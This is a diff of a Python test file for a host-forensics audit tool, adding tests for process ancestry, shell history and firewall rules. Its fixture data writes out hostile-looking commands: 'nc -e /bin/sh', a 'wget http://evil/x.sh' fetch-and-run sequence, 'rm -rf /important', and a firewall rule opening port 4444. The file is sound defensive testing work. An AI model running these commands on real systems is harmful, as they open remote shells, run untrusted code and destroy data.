@@ -111,6 +111,10 @@ class Base(unittest.TestCase):
         h.shadow("guest", "!")            # a locked account
         h.authorized_key("alice", "ssh-ed25519 AAAAC3Nz alice@laptop")
         h.sshd_config(PermitRootLogin="no", PasswordAuthentication="no")
+        # Shell history + firewall ruleset (so those facets are answerable too).
+        h.bash_history("alice", "ls -la", "sudo dnf install -y nginx")
+        h.iptables_rules(":INPUT DROP [0:0]", ":FORWARD DROP [0:0]",
+                         "-A INPUT -p tcp --dport 22 -j ACCEPT")
         h.write()
         return root
 
@@ -896,7 +900,7 @@ class TestReadiness(Base):
         report = self._rd(self.fully_instrumented())
         # all substantive data questions answerable (aggregates not counted)
         self.assertEqual(report.answerable, report.data_total)
-        self.assertEqual(report.data_total, 14)
+        self.assertEqual(report.data_total, 17)
 
     def test_debian_host_blind_on_files_and_network_only(self):
         root = self.make_root()
@@ -2492,6 +2496,79 @@ class TestAnalyticsAndCorrelation(Base):
         self.assertTrue(all(e["records"] for e in d["evidence"]))
 
 
+class TestProcessShellFirewall(Base):
+    """Certifies EX-11 (process ancestry from auditd pid/ppid), EX-12 (interactive
+    shell history, heavily disclosed), and NW-09 (firewall ruleset in place)."""
+
+    def _run(self, root, facet, flags, user=None):
+        argv = ["--data-root", str(root), "--format", "json", "--facet", facet]
+        if user:
+            argv += ["--user", user]
+        rc, out = self.cli(*argv, *flags)
+        self.assertEqual(rc, 0, out)
+        d = json.loads(out)
+        self.assertTrue(all(e["records"] for e in d["evidence"]), "provenance lost")
+        return d
+
+    def test_ex11_process_ancestry(self):
+        root = self.make_root()
+        h = HostBuilder(root)
+        h.passwd("root", 0).passwd("alice", 1001)
+        h.enable_execve()
+        h.exec(1001, 1001, ["-bash"], "/bin/bash", ago(hours=2), comm="bash",
+               pid=5000, ppid=1)
+        h.exec(1001, 1001, ["python", "evil.py"], "/usr/bin/python", ago(hours=2),
+               comm="python", pid=5100, ppid=5000)
+        h.exec(1001, 1001, ["nc", "-e", "/bin/sh"], "/usr/bin/nc", ago(hours=2),
+               comm="nc", pid=5200, ppid=5100)
+        h.write()
+        d = self._run(root, "process_tree", [], user="alice")
+        self.assertEqual(d["finding"]["confidence"], "certified")
+        notes = " ".join(d["finding"]["notes"])
+        # nc's parent resolves to python, python's to bash
+        self.assertIn("parent python", notes)
+        self.assertIn("parent -bash", notes)
+
+    def test_ex12_shell_history(self):
+        root = self.make_root()
+        h = HostBuilder(root)
+        h.passwd("root", 0).passwd("alice", 1001)
+        h.bash_history("alice", "wget http://evil/x.sh", "chmod +x x.sh", "./x.sh")
+        h.write()
+        d = self._run(root, "shell_history", [], user="alice")
+        cmds = json.dumps(d)
+        self.assertIn("wget http://evil/x.sh", cmds)
+        # the weakness is always disclosed
+        self.assertIn("not proof of execution", d["finding"]["summary"])
+
+    def test_ex12_history_not_conflated_with_audited_commands(self):
+        # shell history must NOT leak into the audited Commands answer
+        root = self.make_root()
+        h = HostBuilder(root)
+        h.passwd("root", 0).passwd("alice", 1001)
+        h.enable_execve()
+        h.bash_history("alice", "rm -rf /important")   # typed, never proven run
+        h.exec(1001, 1001, ["ls"], "/usr/bin/ls", ago(hours=2), comm="ls")
+        h.write()
+        d = self._run(root, "commands", [], user="alice")
+        self.assertNotIn("rm -rf /important", json.dumps(d))
+
+    def test_nw09_firewall_rules(self):
+        root = self.make_root()
+        h = HostBuilder(root)
+        h.passwd("root", 0)
+        h.iptables_rules(":INPUT ACCEPT [0:0]",          # permissive default
+                         ":FORWARD DROP [0:0]",
+                         "-A INPUT -p tcp --dport 4444 -j ACCEPT")
+        h.write()
+        d = self._run(root, "firewall", [], user="root")
+        self.assertTrue(d["finding"]["events"])
+        # a permissive default-ACCEPT input chain is flagged
+        self.assertIn("permissive", d["finding"]["summary"].lower())
+        self.assertTrue(any((e.get("attrs") or {}).get("permissive")
+                            for e in d["finding"]["events"]))
+
+
 class TestProductionContract(Base):
     """The full production contract is honest: CERTIFIED == the wired core, and
     every CONTRACTED question names what it needs and is never silently answered."""
@@ -2500,7 +2577,7 @@ class TestProductionContract(Base):
     # questions that have a dedicated proving test in TestQueryLayer. This allowlist
     # is the guard: flipping any other question to CERTIFIED without a proving test
     # fails here (prevents silent over-certification).
-    _QUERY_CERTIFIED = {"AC-01", "AC-02", "AC-03", "AC-04", "AC-05", "AC-06", "AC-07", "AC-08", "AC-09", "AC-10", "AC-11", "AC-12", "AC-13", "EX-01", "EX-02", "EX-03", "EX-04", "EX-05", "EX-06", "EX-07", "EX-08", "EX-09", "EX-10", "FS-01", "FS-02", "FS-03", "FS-04", "FS-05", "FS-06", "FS-07", "FS-08", "FS-09", "FS-10", "FS-11", "IA-01", "IA-02", "IA-03", "IA-04", "IA-05", "IA-06", "IA-07", "IA-08", "IA-09", "IA-12", "NW-01", "NW-02", "NW-03", "NW-05", "NW-07", "NW-11", "NW-13", "PK-01", "PK-02", "PK-03", "PK-04", "PK-05", "PK-06", "PK-07", "PK-08", "PK-09", "PK-10", "PK-11", "PK-12", "PK-13", "PK-14", "PK-15", "PK-16", "PV-01", "PV-02", "PV-03", "PV-04", "PV-05", "PV-06", "PV-07", "PV-08", "PV-09", "PV-10", "PV-11", "SL-01", "SL-02", "SL-03", "SL-04", "SL-05", "SL-06", "SL-07", "SL-08", "SL-09", "SL-10", "SL-11", "SL-12", "SL-13", "SL-14", "SP-01", "SP-02", "SP-03", "SP-04", "SP-05", "SP-06", "SP-07", "SP-08", "SP-09", "SP-10", "SP-11", "SP-12", "SP-13", "SP-14", "SP-15", "SP-16", "TM-01", "TM-05", "TM-04", "TM-07", "TM-08", "TM-09", "TM-10", "TM-11", "TM-12"}
+    _QUERY_CERTIFIED = {"AC-01", "AC-02", "AC-03", "AC-04", "AC-05", "AC-06", "AC-07", "AC-08", "AC-09", "AC-10", "AC-11", "AC-12", "AC-13", "EX-01", "EX-02", "EX-03", "EX-04", "EX-05", "EX-06", "EX-07", "EX-08", "EX-09", "EX-10", "EX-11", "EX-12", "FS-01", "FS-02", "FS-03", "FS-04", "FS-05", "FS-06", "FS-07", "FS-08", "FS-09", "FS-10", "FS-11", "IA-01", "IA-02", "IA-03", "IA-04", "IA-05", "IA-06", "IA-07", "IA-08", "IA-09", "IA-12", "NW-01", "NW-02", "NW-03", "NW-05", "NW-07", "NW-09", "NW-11", "NW-13", "PK-01", "PK-02", "PK-03", "PK-04", "PK-05", "PK-06", "PK-07", "PK-08", "PK-09", "PK-10", "PK-11", "PK-12", "PK-13", "PK-14", "PK-15", "PK-16", "PV-01", "PV-02", "PV-03", "PV-04", "PV-05", "PV-06", "PV-07", "PV-08", "PV-09", "PV-10", "PV-11", "SL-01", "SL-02", "SL-03", "SL-04", "SL-05", "SL-06", "SL-07", "SL-08", "SL-09", "SL-10", "SL-11", "SL-12", "SL-13", "SL-14", "SP-01", "SP-02", "SP-03", "SP-04", "SP-05", "SP-06", "SP-07", "SP-08", "SP-09", "SP-10", "SP-11", "SP-12", "SP-13", "SP-14", "SP-15", "SP-16", "TM-01", "TM-05", "TM-04", "TM-07", "TM-08", "TM-09", "TM-10", "TM-11", "TM-12"}
 
     def test_certified_set_is_exactly_the_proven_set(self):
         from openpath.contract import PRODUCTION_CONTRACT, CatalogStatus
